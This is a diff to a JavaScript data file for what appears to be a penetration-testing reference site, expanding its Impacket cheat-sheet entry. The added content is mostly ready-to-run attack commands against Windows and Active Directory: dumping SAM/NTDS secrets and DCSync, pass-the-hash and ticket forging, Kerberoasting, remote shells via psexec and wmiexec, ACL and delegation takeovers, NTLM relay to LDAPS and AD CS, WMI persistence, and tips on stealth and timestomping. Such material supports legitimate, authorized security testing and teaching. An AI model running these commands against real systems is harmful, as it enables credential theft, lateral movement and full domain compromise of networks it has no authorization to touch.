@@ -1349,79 +1349,708 @@ var TOOLKIT = [
         ]
       },
       {
-        id: "impacket-suite",
-        name: "Impacket Suite",
-        url: "https://github.com/fortra/impacket",
-        description: "Python scripts for attacking Windows/AD protocols — secrets, tickets, and shells.",
-        brief: "Impacket is a collection of Python classes and ready-to-run scripts for working directly with Windows network protocols. On an AD engagement it's usually reached for right after NetExec confirms valid credentials — for dumping secrets, requesting or forging Kerberos tickets, and getting a shell.",
-        quickReference: [
-          { label: "Dump SAM / LSA / NTDS remotely", cmd: "secretsdump.py domain/user:pass@target" },
-          { label: "Shell over SMB", cmd: "psexec.py domain/user:pass@target" },
-          { label: "Kerberoast", cmd: "GetUserSPNs.py domain/user:pass -dc-ip <dc> -request" },
-          { label: "Get a TGT using an NT hash", cmd: "getTGT.py domain/user -hashes :<nthash>" }
+        "id": "impacket-suite",
+        "name": "Impacket Suite",
+        "url": "https://github.com/fortra/impacket",
+        "description": "Python classes + ~70 example scripts for attacking Windows/AD protocols — secrets, tickets, shells, relay.",
+        "brief": "Impacket is a collection of Python classes for working directly with Windows network protocols (SMB, MSRPC, DCOM, LDAP, Kerberos, MS-TDS, NTLM), plus ~70 ready-to-run example scripts in examples/. On an AD engagement it is the workhorse reached for the moment valid credentials are confirmed — for dumping secrets, roasting and forging Kerberos tickets, getting a shell, editing AD objects, and relaying NTLM.\n\nAlmost every script shares the same target string and authentication model (below), so once you know how to point one at a host and pass a password, hash, AES key or ticket, you know them all. Distro packages expose each script prefixed, e.g. impacket-secretsdump, impacket-wmiexec.",
+        "quickReference": [
+          {
+            "label": "Dump SAM/LSA/NTDS",
+            "cmd": "secretsdump.py domain/user:pass@target"
+          },
+          {
+            "label": "Shell over WMI (quiet)",
+            "cmd": "wmiexec.py domain/user:pass@target"
+          },
+          {
+            "label": "Kerberoast",
+            "cmd": "GetUserSPNs.py domain/user:pass -dc-ip <dc> -request"
+          },
+          {
+            "label": "AS-REP roast",
+            "cmd": "GetNPUsers.py domain/ -usersfile users.txt -dc-ip <dc>"
+          },
+          {
+            "label": "NTLM relay to LDAPS",
+            "cmd": "ntlmrelayx.py -t ldaps://<dc> --escalate-user <you>"
+          }
         ],
-        sections: [
+        "sections": [
           {
-            title: "Credential Dumping",
-            type: "table",
-            columns: ["Command", "Description"],
-            rows: [
-              ["secretsdump.py domain/user:pass@target", "Remote dump of SAM, cached creds, and LSA secrets"],
-              ["secretsdump.py domain/user:pass@dc -just-dc-ntlm", "Pull NTDS.dit hashes only (faster, quieter than a full -just-dc)"],
-              ["secretsdump.py -sam SAM -system SYSTEM LOCAL", "Parse an offline copy of SAM/SYSTEM instead of hitting the network"]
+            "title": "Universal connection & authentication flags (apply to almost every script)",
+            "type": "table",
+            "columns": [
+              "Flag / token",
+              "Meaning"
+            ],
+            "rows": [
+              [
+                "domain/user:password@target",
+                "Standard target string. Omit :password to be prompted; omit @target for LDAP/DC-only tools"
+              ],
+              [
+                "-hashes LMHASH:NTHASH",
+                "Pass-the-hash. Use an empty LM half, e.g. -hashes :<nthash>"
+              ],
+              [
+                "-k",
+                "Use Kerberos auth from the ccache in $KRB5CCNAME (pass-the-ticket)"
+              ],
+              [
+                "-no-pass",
+                "Don't prompt for a password (pair with -k, -hashes or -aesKey)"
+              ],
+              [
+                "-aesKey <hex>",
+                "Kerberos with an AES128/256 key (pass-the-key / overpass-the-hash)"
+              ],
+              [
+                "-dc-ip <ip>",
+                "IP of the domain controller / KDC to talk to"
+              ],
+              [
+                "-dc-host <fqdn>",
+                "DC hostname — needed for the Kerberos SPN when it differs from -dc-ip"
+              ],
+              [
+                "-target-ip <ip>",
+                "Where to actually connect when the target name is not routable"
+              ],
+              [
+                "-port <n>",
+                "Non-default service port"
+              ],
+              [
+                "-ldaps",
+                "Use LDAPS (636/TLS) instead of LDAP on the LDAP-based tools"
+              ],
+              [
+                "-ts / -debug",
+                "Prefix every log line with a timestamp / enable verbose debug"
+              ]
             ]
           },
           {
-            title: "Remote Execution",
-            type: "table",
-            columns: ["Command", "Description"],
-            rows: [
-              ["psexec.py domain/user:pass@target", "Classic service-based shell — drops and runs a service binary"],
-              ["wmiexec.py domain/user:pass@target", "Semi-fileless execution over WMI — quieter, no service creation"],
-              ["smbexec.py domain/user:pass@target", "Alternative service-based execution, different opsec footprint than psexec"],
-              ["atexec.py domain/user:pass@target \"whoami\"", "One-shot command execution via the task scheduler"]
+            "title": "Credential dumping & secrets",
+            "type": "table",
+            "columns": [
+              "Script",
+              "Purpose",
+              "Key flags"
+            ],
+            "rows": [
+              [
+                "secretsdump.py",
+                "Dump SAM, cached creds, LSA secrets and (on a DC) NTDS.dit",
+                "-just-dc, -just-dc-ntlm, -just-dc-user <u>, -use-vss, -sam/-system/-security/-ntds (offline), -exec-method, -history, -outputfile"
+              ],
+              [
+                "regsecrets.py",
+                "secretsdump alternative that reads secrets via the remote registry (different footprint)",
+                "same model as secretsdump; -exec-method"
+              ],
+              [
+                "dpapidump.py",
+                "Automate extraction of the SYSTEM user's DPAPI credentials on a remote host",
+                "standard auth (-hashes/-k)"
+              ],
+              [
+                "Get-GPPPassword.py",
+                "Extract & decrypt Group Policy Preferences cpasswords from SYSVOL (or a local XML)",
+                "-xmlfile <Groups.xml> LOCAL  |  domain/user:pass@dc, -share, -base-dir"
+              ],
+              [
+                "GetLAPSPassword.py",
+                "Read LAPS / LAPSv2 local-admin passwords from the directory",
+                "-computer <name>, -outputfile, -ldaps"
+              ],
+              [
+                "keylistattack.py",
+                "KERB-KEY-LIST-REQ attack to dump key material (RODC / read-only KDC)",
+                "-rodcNo <id>, -rodcKey <key>, -full, -t/-tf, -domain-sid"
+              ],
+              [
+                "dpapi.py",
+                "Offline/remote DPAPI & Vault toolkit — decrypt masterkeys, credentials, vaults, blobs",
+                "subcommands masterkey/credential/vault/backupkeys; -file, -key, -sid, -pvk, -masterkey"
+              ],
+              [
+                "getPac.py",
+                "Fetch the PAC of a target user with only normal authenticated creds",
+                "-targetUser <user>"
+              ]
             ]
           },
           {
-            title: "Kerberos Attacks",
-            type: "table",
-            columns: ["Command", "Description"],
-            rows: [
-              ["GetUserSPNs.py domain/user:pass -dc-ip <dc> -request", "Kerberoast every account with an SPN set"],
-              ["GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip <dc>", "AS-REP roast accounts with Kerberos pre-auth disabled"],
-              ["ticketer.py -nthash <krbtgt_hash> -domain-sid <sid> -domain domain.local user", "Forge a golden ticket once you hold the krbtgt hash"],
-              ["getTGT.py domain/user -hashes :<nthash>", "Request a TGT using a password, NT hash, or AES key"],
-              ["getST.py -spn <spn> domain/user:pass", "Request a service ticket directly (silver-ticket-style access)"]
+            "title": "secretsdump.py — workflows",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Remote: SAM + LSA + cached logons",
+                "cmd": "secretsdump.py domain/user:pass@target\n# add -hashes :<nthash> to pass-the-hash, or -k -no-pass for Kerberos"
+              },
+              {
+                "label": "Domain hashes from a DC (quieter NTLM-only)",
+                "cmd": "secretsdump.py domain/user:pass@dc -just-dc-ntlm\n# -just-dc also pulls Kerberos keys + password history; -just-dc-user krbtgt for one account"
+              },
+              {
+                "label": "Targeted DCSync of one account",
+                "cmd": "secretsdump.py -just-dc-user Administrator domain/user:pass@dc"
+              },
+              {
+                "label": "Offline from exported hives / NTDS",
+                "cmd": "secretsdump.py -sam SAM -system SYSTEM LOCAL\nsecretsdump.py -ntds ntds.dit -system SYSTEM LOCAL"
+              },
+              {
+                "label": "Use VSS instead of DRSUAPI on the DC",
+                "cmd": "secretsdump.py domain/user:pass@dc -use-vss"
+              }
             ]
           },
           {
-            title: "SMB & File Access",
-            type: "table",
-            columns: ["Command", "Description"],
-            rows: [
-              ["smbclient.py domain/user:pass@target", "Interactive SMB client for browsing/pulling files from shares"],
-              ["lookupsid.py domain/user:pass@target", "RID-cycle a target to enumerate users and groups"],
-              ["rpcdump.py domain/user:pass@target", "Enumerate exposed RPC endpoints on a target"],
-              ["reg.py domain/user:pass@target query -keyName <key>", "Read remote registry keys/values"]
+            "title": "Remote code execution",
+            "type": "table",
+            "columns": [
+              "Script",
+              "Purpose",
+              "Key flags"
+            ],
+            "rows": [
+              [
+                "psexec.py",
+                "SYSTEM shell by dropping & running a service binary (RemComSvc)",
+                "-c <localbin>, -path, -service-name, -remote-binary-name, -codec"
+              ],
+              [
+                "smbexec.py",
+                "Semi-interactive exec via a service, no binary dropped",
+                "-mode SERVER|SHARE, -share, -shell-type cmd|powershell, -service-name"
+              ],
+              [
+                "wmiexec.py",
+                "Semi-fileless exec over WMI (DCOM) — no service created",
+                "-share, -nooutput, -silentcommand, -shell-type, -com-version"
+              ],
+              [
+                "atexec.py",
+                "One-shot command via the Task Scheduler (ATSVC)",
+                "-session-id <id>, -silentcommand (positional: target command)"
+              ],
+              [
+                "dcomexec.py",
+                "Exec through DCOM objects (MMC20 / ShellWindows / ShellBrowserWindow)",
+                "-object MMC20|ShellWindows|ShellBrowserWindow, -nooutput, -silentcommand"
+              ],
+              [
+                "sambaPipe.py",
+                "Exploit SambaCry (CVE-2017-7494) — load a shared library on a Samba host",
+                "standard auth; path to the .so"
+              ]
             ]
           },
           {
-            title: "Common Workflows",
-            type: "commands",
-            commands: [
-              { label: "Credential dump after admin access", cmd: "secretsdump.py domain/user:pass@target\n# review NTLM hashes, then reuse directly:\npsexec.py -hashes :<nthash> domain/user@target" },
-              { label: "Kerberoasting from a standard user", cmd: "GetUserSPNs.py domain/user:pass -dc-ip <dc> -request\nhashcat -m 13100 hashes.txt rockyou.txt" },
-              { label: "Pass-the-hash to a shell", cmd: "wmiexec.py -hashes :<nthash> domain/user@target" }
+            "title": "Remote execution — workflows",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "wmiexec with pass-the-hash (quiet default)",
+                "cmd": "wmiexec.py domain/user@target -hashes :<nthash>\nwmiexec.py domain/user:pass@target -silentcommand \"whoami /all\""
+              },
+              {
+                "label": "psexec for a full SYSTEM shell",
+                "cmd": "psexec.py domain/user:pass@target\npsexec.py -k -no-pass domain/user@target        # via Kerberos ccache"
+              },
+              {
+                "label": "smbexec with a PowerShell shell",
+                "cmd": "smbexec.py domain/user:pass@target -shell-type powershell"
+              },
+              {
+                "label": "atexec / dcomexec one-shot",
+                "cmd": "atexec.py domain/user:pass@target \"ipconfig /all\"\ndcomexec.py -object MMC20 domain/user:pass@target \"whoami\""
+              }
             ]
           },
           {
-            title: "Notes & Tips",
-            type: "notes",
-            items: [
-              "Most scripts accept -hashes LM:NT in place of a password — pass-the-hash works throughout the suite, not just for execution.",
-              "wmiexec.py and atexec.py tend to leave a lighter footprint than psexec.py, which creates and starts an actual service.",
-              "secretsdump.py's -just-dc-ntlm is worth defaulting to for a full DC dump — it skips history/extra attributes you usually don't need.",
-              "Kerberos-based scripts (getTGT.py, GetUserSPNs.py, etc.) generally need correct time sync with the DC or authentication fails outright."
+            "title": "Kerberos — roasting, tickets & forging",
+            "type": "table",
+            "columns": [
+              "Script",
+              "Purpose",
+              "Key flags"
+            ],
+            "rows": [
+              [
+                "GetUserSPNs.py",
+                "Kerberoast — find SPN-bearing accounts and request their TGS",
+                "-request, -request-user <u>, -usersfile, -no-preauth <u> (targeted, no creds), -stealth, -outputfile, -dc-host"
+              ],
+              [
+                "GetNPUsers.py",
+                "AS-REP roast — users with Kerberos pre-auth disabled",
+                "-request, -usersfile, -format hashcat|john, -no-pass, -outputfile"
+              ],
+              [
+                "getTGT.py",
+                "Request a TGT from a password, hash, AES key or certificate (PKINIT)",
+                "-hashes, -aesKey, -cert-pfx <f> -pfx-pass, -cert-pem/-key-pem, -principalType"
+              ],
+              [
+                "getST.py",
+                "Request a service ticket — S4U delegation, U2U, dMSA (BadSuccessor)",
+                "-spn <spn>, -impersonate <user>, -self, -altservice <svc>, -u2u, -additional-ticket, -dmsa <dMSA$>, -force-forwardable"
+              ],
+              [
+                "ticketer.py",
+                "Forge golden / silver tickets (or from a legally-requested template)",
+                "-nthash|-aesKey, -domain-sid, -spn (silver), -groups, -user-id, -extra-sid, -impersonate, -request"
+              ],
+              [
+                "ticketConverter.py",
+                "Convert between .kirbi (Mimikatz) and .ccache (Impacket)",
+                "positional: input output (direction auto-detected)"
+              ],
+              [
+                "describeTicket.py",
+                "Parse a ticket, decrypt enc-part, and dump the PAC",
+                "positional: ticket; -p <pass>, --rc4/--aes/--asrep-key <key>"
+              ],
+              [
+                "goldenPac.py",
+                "MS14-068 — forge a PAC to become Domain Admin on an unpatched DC",
+                "domain/user:pass@target-fqdn (+ command)"
+              ],
+              [
+                "raiseChild.py",
+                "Child-domain → forest-root privilege escalation (automated)",
+                "-target-exec <forest-dc>, -targetRID, -w <ccache>"
+              ]
+            ]
+          },
+          {
+            "title": "Kerberos — workflows",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Kerberoast (all, then one user)",
+                "cmd": "GetUserSPNs.py domain/user:pass -dc-ip <dc> -request\nGetUserSPNs.py domain/user:pass -dc-ip <dc> -request-user svc_sql -outputfile roast.txt"
+              },
+              {
+                "label": "Targeted roast with no creds (-no-preauth)",
+                "cmd": "GetUserSPNs.py -no-preauth <nopreauth_user> -usersfile targets.txt -dc-host dc.domain.local domain/"
+              },
+              {
+                "label": "AS-REP roast",
+                "cmd": "GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip <dc>"
+              },
+              {
+                "label": "TGT from a hash / an AES key / a certificate",
+                "cmd": "getTGT.py domain/user -hashes :<nthash>\ngetTGT.py domain/user -aesKey <hex>\ngetTGT.py domain/user -cert-pfx user.pfx -pfx-pass ''      # PKINIT (ESC1 / shadow creds)"
+              },
+              {
+                "label": "S4U — impersonate a user to a service (constrained deleg)",
+                "cmd": "export KRB5CCNAME=svc.ccache\ngetST.py -spn cifs/target.domain.local -impersonate Administrator domain/svc$ -no-pass -k"
+              },
+              {
+                "label": "BadSuccessor — dMSA ticket (Server 2025)",
+                "cmd": "getST.py -dmsa <dmsa$> -impersonate Administrator -spn cifs/dc.domain.local domain/user:pass"
+              },
+              {
+                "label": "Golden / silver ticket, then convert",
+                "cmd": "ticketer.py -nthash <krbtgt_nt> -domain-sid <S-1-5-21-...> -domain domain.local Administrator\nticketConverter.py ticket.kirbi ticket.ccache"
+              }
+            ]
+          },
+          {
+            "title": "AD objects, ACLs & delegation",
+            "type": "table",
+            "columns": [
+              "Script",
+              "Purpose",
+              "Key flags"
+            ],
+            "rows": [
+              [
+                "rbcd.py",
+                "Read/write msDS-AllowedToActOnBehalfOfOtherIdentity (resource-based constrained delegation)",
+                "-delegate-to 'TARGET$', -delegate-from 'ATTACKER$', -action read|write|remove|flush (positional: identity)"
+              ],
+              [
+                "dacledit.py",
+                "Read/modify an object DACL — grant yourself DCSync, reset-password, etc.",
+                "-action read|write|remove|backup|restore, -principal <you>, -target <victim>, -rights FullControl|ResetPassword|WriteMembers|DCSync|Custom, -rights-guid, -inheritance"
+              ],
+              [
+                "owneredit.py",
+                "Read/modify an object Owner (the step before dacledit when you lack WriteDACL)",
+                "-action read|write, -new-owner <you>, -target <victim>"
+              ],
+              [
+                "addcomputer.py",
+                "Add (or delete) a computer account via SAMR or LDAPS (MachineAccountQuota)",
+                "-method SAMR|LDAPS, -computer-name 'EVIL$', -computer-pass <pw>, -delete, -no-add, -baseDN"
+              ],
+              [
+                "findDelegation.py",
+                "Enumerate unconstrained / constrained / RBCD delegation in the domain",
+                "-user <u>, -disabled, -dc-ip"
+              ],
+              [
+                "badsuccessor.py",
+                "dMSA exploitation (BadSuccessor) — abuse a delegated MSA for escalation",
+                "-action, -dmsa-name, -target-ou, -principals-allowed, -target-account, -method"
+              ],
+              [
+                "net.py",
+                "net.exe-style user/group/computer management over MSRPC",
+                "subcommands user/group/computer/localgroup; -name, -create/-remove, -join/-unjoin, -newPasswd"
+              ],
+              [
+                "changepasswd.py",
+                "Change your own, or reset another account's, password (SAMR/kpasswd/LDAP)",
+                "-newpass <new>, -altuser <admin> -altpass <pw> (reset as admin)"
+              ],
+              [
+                "GetADUsers.py",
+                "Enumerate domain users (and emails / last-logon) via LDAP",
+                "-all, -user <u>, -ldaps"
+              ],
+              [
+                "GetADComputers.py",
+                "Enumerate domain computers via LDAP",
+                "-all, -ldaps"
+              ]
+            ]
+          },
+          {
+            "title": "ACLs & delegation — workflows",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "RBCD takeover (write, then S4U)",
+                "cmd": "addcomputer.py -method LDAPS -computer-name 'EVIL$' -computer-pass 'Pass123!' domain/user:pass\nrbcd.py -delegate-to 'TARGET$' -delegate-from 'EVIL$' -action write -dc-ip <dc> domain/user:pass\ngetST.py -spn cifs/target.domain.local -impersonate Administrator domain/EVIL$:'Pass123!'"
+              },
+              {
+                "label": "Grant yourself DCSync over the domain",
+                "cmd": "dacledit.py -action write -rights DCSync -principal <you> -target-dn \"DC=domain,DC=local\" domain/user:pass -dc-ip <dc>"
+              },
+              {
+                "label": "Take ownership, then write the DACL",
+                "cmd": "owneredit.py -action write -new-owner <you> -target <victim> domain/user:pass\ndacledit.py -action write -rights FullControl -principal <you> -target <victim> domain/user:pass"
+              },
+              {
+                "label": "Reset a user's password as an admin",
+                "cmd": "changepasswd.py domain/victim@dc -newpass 'Newpass123!' -altuser domain/admin -altpass '<adminpass>'"
+              }
+            ]
+          },
+          {
+            "title": "SMB, RPC & host enumeration",
+            "type": "table",
+            "columns": [
+              "Script",
+              "Purpose",
+              "Key flags"
+            ],
+            "rows": [
+              [
+                "smbclient.py",
+                "Interactive SMB client (browse shares, get/put files)",
+                "-inputfile <cmds>, -outputfile, -dfs-follow"
+              ],
+              [
+                "smbserver.py",
+                "Stand up an SMB server (hash capture / payload staging / exfil)",
+                "shareName sharePath, -smb2support, -username/-password, -ip, -port"
+              ],
+              [
+                "lookupsid.py",
+                "RID cycling via MS-LSAT — enumerate users/groups from a SID",
+                "positional: target [maxRid], -domain-sids"
+              ],
+              [
+                "samrdump.py",
+                "SAMR enumeration of users, groups and aliases",
+                "-csv"
+              ],
+              [
+                "reg.py",
+                "Remote registry: query/add/delete/save/backup/load",
+                "subcommands; -keyName, -v, -s, -o <dir>"
+              ],
+              [
+                "services.py",
+                "Remote service control (MS-SCMR): list/start/stop/create/change/config/delete",
+                "-name, -display, -path, -service_type, -start_type"
+              ],
+              [
+                "rpcdump.py",
+                "Dump the MSRPC endpoint mapper (EPM) — listening interfaces",
+                "standard auth"
+              ],
+              [
+                "rpcmap.py",
+                "Scan an MSRPC string binding for listening interface UUIDs",
+                "positional: stringbinding, -auth-*"
+              ],
+              [
+                "netview.py",
+                "Track logged-on users / open sessions across hosts",
+                "-target <host>, -users, -targets"
+              ],
+              [
+                "getArch.py",
+                "Get a target's OS architecture over DCE/RPC (no creds)",
+                "-target <host>"
+              ],
+              [
+                "machine_role.py",
+                "Retrieve a host's role (standalone/member/DC) via MS-DSSP",
+                "standard auth"
+              ],
+              [
+                "DumpNTLMInfo.py",
+                "Dump host/NTLM info from SMB with no credentials (OS, domain, signing)",
+                "(no auth needed)"
+              ],
+              [
+                "CheckLDAPStatus.py",
+                "Report LDAP signing and LDAPS channel-binding enforcement",
+                "-ldaps"
+              ],
+              [
+                "checkMSSQLStatus.py",
+                "Report MSSQL signing/encryption posture",
+                "standard auth"
+              ],
+              [
+                "attrib.py / filetime.py",
+                "Query/modify file attributes and timestamps (timestomp) over pure SMB",
+                "standard auth"
+              ],
+              [
+                "esentutl.py / ntfs-read.py / registry-read.py",
+                "Dump an ESE DB, browse a raw NTFS volume, or read offline registry hives",
+                "local file args"
+              ],
+              [
+                "tstool.py",
+                "Terminal Services (RDP session) query / disconnect / logoff / message",
+                "standard auth"
+              ]
+            ]
+          },
+          {
+            "title": "MSSQL",
+            "type": "table",
+            "columns": [
+              "Script",
+              "Purpose",
+              "Key flags"
+            ],
+            "rows": [
+              [
+                "mssqlclient.py",
+                "Interactive MS-TDS client — xp_cmdshell, linked servers, impersonation",
+                "-windows-auth, -db <name>, -k, -command <q>, -file, -named-pipe"
+              ],
+              [
+                "mssqlinstance.py",
+                "Enumerate MSSQL instance names on a host (MC-SQLR / UDP 1434)",
+                "positional: host"
+              ],
+              [
+                "checkMSSQLStatus.py",
+                "Check a server's signing / encryption configuration",
+                "standard auth"
+              ]
+            ]
+          },
+          {
+            "title": "mssqlclient.py — workflows",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Connect (SQL / Windows / Kerberos auth)",
+                "cmd": "mssqlclient.py domain/user:pass@sql -windows-auth\nmssqlclient.py -k sql.domain.local        # Kerberos from the ccache"
+              },
+              {
+                "label": "Code execution via xp_cmdshell",
+                "cmd": "# in the SQL shell:\nenable_xp_cmdshell\nxp_cmdshell whoami"
+              },
+              {
+                "label": "Linked-server crawl & impersonation",
+                "cmd": "enum_links\nuse_link <LINKED_SERVER>\nexec_as_login sa   /   exec_as_user dbo"
+              }
+            ]
+          },
+          {
+            "title": "NTLM relay & MITM",
+            "type": "table",
+            "columns": [
+              "Script",
+              "Purpose",
+              "Key flags"
+            ],
+            "rows": [
+              [
+                "ntlmrelayx.py",
+                "Relay captured NTLM auth to SMB/LDAP(S)/HTTP/MSSQL/RPC and run an attack",
+                "-t/-tf <target(s)>, -smb2support, -i (interactive), -socks, -c/-e, --remove-mic"
+              ],
+              [
+                "ntlmrelayx.py (LDAP attacks)",
+                "Act in the directory as the relayed victim",
+                "--escalate-user <u>, --delegate-access, --add-computer, --shadow-credentials --shadow-target, --dump-laps, --dump-gmsa, --dump-adcs"
+              ],
+              [
+                "ntlmrelayx.py (ADCS / ESC8 & ESC11)",
+                "Relay to web-enrollment or the RPC CA to get a cert",
+                "--adcs, --template <T>, -rpc-mode ICPR -icpr-ca-name <CA>"
+              ],
+              [
+                "karmaSMB.py",
+                "Serve attacker-chosen files in response to any SMB file request",
+                "positional: answer file"
+              ],
+              [
+                "rdp_check.py",
+                "Validate credentials against RDP (CredSSP/NLA) without a full session",
+                "standard auth"
+              ],
+              [
+                "kintercept.py",
+                "Kerberos relay / interception helper used when testing relay chains",
+                "(helper)"
+              ]
+            ]
+          },
+          {
+            "title": "ntlmrelayx.py — workflows",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Relay to LDAPS and escalate (RBCD / ACL)",
+                "cmd": "ntlmrelayx.py -t ldaps://<dc> --escalate-user <you> --delegate-access\n# coerce auth into you (PetitPotam / PrinterBug / DFSCoerce) while this runs"
+              },
+              {
+                "label": "Relay to SMB and run a command",
+                "cmd": "ntlmrelayx.py -t smb://<host> -smb2support -c \"powershell -enc <b64>\"\nntlmrelayx.py -tf targets.txt -smb2support -i      # or drop to an interactive SMB client"
+              },
+              {
+                "label": "Relay to AD CS web enrollment (ESC8)",
+                "cmd": "ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"
+              },
+              {
+                "label": "Shadow Credentials over LDAPS",
+                "cmd": "ntlmrelayx.py -t ldaps://<dc> --shadow-credentials --shadow-target '<victim$>'"
+              },
+              {
+                "label": "Harvest LAPS / gMSA while relaying",
+                "cmd": "ntlmrelayx.py -t ldaps://<dc> --dump-laps --dump-gmsa"
+              }
+            ]
+          },
+          {
+            "title": "DPAPI, persistence & misc utilities",
+            "type": "table",
+            "columns": [
+              "Script",
+              "Purpose",
+              "Key flags"
+            ],
+            "rows": [
+              [
+                "wmipersist.py",
+                "Install/remove WMI event-subscription persistence (filter + consumer)",
+                "-name, -vbs/-filter, -timer, remove"
+              ],
+              [
+                "wmiquery.py",
+                "Run arbitrary WQL queries over WMI",
+                "positional: query"
+              ],
+              [
+                "mimikatz.py",
+                "Mini-shell driving a remote Mimikatz RPC server (@gentilkiwi)",
+                "standard auth"
+              ],
+              [
+                "exchanger.py",
+                "Interact with MS Exchange over RPC-over-HTTP v2 (NSPI, EWS-style tasks)",
+                "-r, action subcommands"
+              ],
+              [
+                "samedit.py",
+                "Replace a local user's password through the SAM (offline/remote)",
+                "standard auth"
+              ],
+              [
+                "sniff.py / sniffer.py",
+                "Simple packet sniffers",
+                "(interface args)"
+              ],
+              [
+                "ping.py / ping6.py",
+                "ICMP / ICMPv6 ping built on the raw-packet classes",
+                "src dst"
+              ],
+              [
+                "split.py",
+                "Split a pcap capture file",
+                "positional: pcap"
+              ],
+              [
+                "mqtt_check.py",
+                "MQTT login probe — can be adapted into a password sprayer",
+                "-username/-password"
+              ],
+              [
+                "karmaSMB.py",
+                "See NTLM relay & MITM",
+                "-"
+              ]
+            ]
+          },
+          {
+            "title": "Notes & OPSEC",
+            "type": "notes",
+            "items": [
+              "Auth model is shared: a password in the target string, -hashes :<nt> (pass-the-hash), -aesKey (pass-the-key), or -k reading $KRB5CCNAME (pass-the-ticket). With -k you almost always also want -no-pass and -dc-ip, and the clock must be within ~5 min of the DC (ntpdate / faketime) or you get KRB_AP_ERR_SKEW.",
+              "Exec footprint, loudest to quietest: psexec (drops a binary + creates a service) > smbexec/atexec (service / scheduled task, no binary) > wmiexec/dcomexec (no service). wmiexec is the usual default; use -silentcommand to skip the semi-interactive output channel.",
+              "secretsdump -just-dc-ntlm pulls only NT hashes via DRSUAPI (quieter than -use-vss, which touches VSS on the DC). Offline mode (-sam/-system/-ntds ... LOCAL) parses hives you already exfiltrated.",
+              "Distro packages prefix the scripts (impacket-secretsdump, impacket-wmiexec, …); a from-source clone runs them as examples/<name>.py. Pipx/venv installs expose the bare <name>.py.",
+              "ntlmrelayx is the hub for coercion→relay: pair it with PetitPotam / PrinterBug / DFSCoerce (or mitm6) to feed it victim auth — see the Coercion & NTLM Relay theory and the AD map relay stage."
+            ]
+          },
+          {
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "Impacket — GitHub (fortra)",
+                "url": "https://github.com/fortra/impacket"
+              },
+              {
+                "label": "Impacket — examples directory",
+                "url": "https://github.com/fortra/impacket/tree/master/examples"
+              },
+              {
+                "label": "Map — AD Attack Path (guided)",
+                "url": "ad-map.html"
+              },
+              {
+                "label": "Theory — Coercion & NTLM Relay",
+                "url": "theory/2026-08-18-coercion-ntlm-relay.html"
+              },
+              {
+                "label": "Theory — AD Certificate Services (ESC)",
+                "url": "theory/2026-08-18-adcs.html"
+              },
+              {
+                "label": "Theory — Kerberos Authentication",
+                "url": "theory/2026-08-18-kerberos.html"
+              }
             ]
           }
         ]
